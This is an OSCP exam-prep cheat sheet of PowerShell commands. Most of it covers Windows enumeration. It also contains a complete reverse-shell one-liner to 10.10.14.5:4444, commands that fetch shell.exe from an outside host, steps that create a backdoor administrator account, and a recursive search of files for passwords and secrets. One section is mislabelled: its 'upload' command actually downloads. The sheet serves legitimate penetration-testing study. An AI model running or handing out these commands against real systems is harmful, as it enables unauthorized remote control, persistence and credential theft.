# OSCP PowerShell Cheat Sheet

A concise, exam-friendly PowerShell cheat sheet for enumeration, post-exploitation helpers, and quick commands useful during the OSCP exam.

> **Note:** Use these only where allowed by the exam rules. Do **not** abuse persistence or actions disallowed by the exam.

---

## System & User Info
```powershell
whoami
whoami /priv
whoami /groups
hostname
systeminfo
getmac
ipconfig /all
```

---

## Process & Service Enumeration
```powershell
Get-Process
Get-Service
tasklist /v
net start
```

---

## Network Enumeration
```powershell
netstat -ano
Get-NetTCPConnection
route print
arp -a
```

---

## User & Group Enumeration
```powershell
net user
net user <username>
net localgroup
net localgroup administrators
```

---

## Shares & SMB
```powershell
net share
Get-SmbShare
Get-SmbSession
```

---

## Scheduled Tasks
```powershell
schtasks /query /fo LIST /v
```

---

## Firewall Rules
```powershell
netsh advfirewall firewall show rule name=all
Get-NetFirewallRule
```

---

## File Search (credential hunting)
```powershell
# common file types, recursive (silently ignore errors)
Get-ChildItem -Path C:\ -Include *.txt,*.config,*.xml -Recurse -ErrorAction SilentlyContinue

# search for passwords/keywords
Select-String -Path C:\* -Pattern "password","passwd","secret" -SimpleMatch -ErrorAction SilentlyContinue
```

---

## Download a file
```powershell
Invoke-WebRequest http://10.10.10.10/shell.exe -OutFile shell.exe
```

## Upload a file (certutil)
```powershell
certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe
```

---

## Base64 Encode / Decode
```powershell
# encode file to base64
[Convert]::ToBase64String([IO.File]::ReadAllBytes("rev.exe"))

# decode base64 back to binary
[IO.File]::WriteAllBytes("rev.exe",[Convert]::FromBase64String("<base64string>"))
```

---

## Add Local User & Add to Admins
> Use only if allowed by exam rules (post-exploitation).
```powershell
net user pwn Pass123! /add
net localgroup administrators pwn /add
```

---

## Reverse Shell One-Liner (PowerShell)
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"
```

---

## Quick Local Port Scan
```powershell
1..1024 | % { if (Test-NetConnection -Port $_ -ComputerName localhost).TcpTestSucceeded { "$_ open" } }
```

---

## Quick Tips
- Start with simple commands: `whoami`, `ipconfig`, `net user`, `systeminfo`.
- Collect everything (screenshots, outputs). Save to files for your notes.
- Avoid noisy or slow scans unless necessary.
- Confirm exam policy before creating accounts or installing persistence.

---

## References / Tools
- `Invoke-WebRequest`, `certutil` for file transfer
- `Select-String` for quick text searching
- `Get-Process`, `Get-Service`, `Get-SmbShare` for host/service info

---

*Generated for study and exam preparation. Use responsibly.*
